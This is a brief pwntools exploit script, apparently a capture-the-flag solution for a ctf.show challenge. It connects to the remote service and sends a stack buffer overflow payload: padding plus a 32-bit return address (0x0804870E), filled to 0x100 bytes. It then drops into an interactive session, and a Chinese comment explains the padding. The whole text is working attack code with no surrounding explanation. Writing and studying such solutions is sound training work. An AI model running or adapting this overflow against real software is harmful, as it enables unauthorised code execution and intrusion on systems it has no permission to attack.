from pwn import *
io = remote('pwn.challenge.ctf.show',28163)
payload = b'a'*(0x11+4) + p32(0x0804870E)
payload = payload.ljust(0x100,b'a') # 用a填充到0x100
io.sendline(payload)
io.recv()
io.interactive()